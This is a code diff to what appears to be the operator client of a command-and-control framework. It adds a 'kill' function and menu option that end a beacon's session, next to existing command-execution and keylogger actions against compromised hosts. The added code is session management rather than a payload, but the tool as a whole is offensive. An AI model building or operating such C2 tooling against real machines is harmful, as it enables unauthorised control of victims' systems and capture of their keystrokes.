@@ -41,6 +41,12 @@ class C2Server:
         if r.status_code == 200:
             print("[+] Command will be executed shortly :)")
 
+    def kill(self, session):
+
+        r = requests.get(f"{self.host}/kill?session={session}")
+        if r.status_code == 200:
+            print(f"[+] Tasked beacon ({session}) to kill connection")
+
     def ping(self):
         try:
             r = requests.get(f"{self.host}/health-check")
@@ -116,6 +122,17 @@ def get_action():
                 choice = int(input("Enter a valid session number: ")) # getting session number
                 if (len(sess_list) - 1) >= choice >= 0:
                     C2Server().keylogger(sess_list[choice][choice])
+                    break
+            except ValueError:
+                print("[!] Only integer values allowed!")
+
+    elif action.upper() == "KILL":
+        while True:
+            try:
+                sess_list = C2Server().get_sessions()
+                choice = int(input("Enter a valid session number: ")) # getting session number
+                if (len(sess_list) - 1) >= choice >= 0:
+                    C2Server().kill(sess_list[choice][choice])
                     break
             except ValueError:
                 print("[!] Only integer values allowed!")
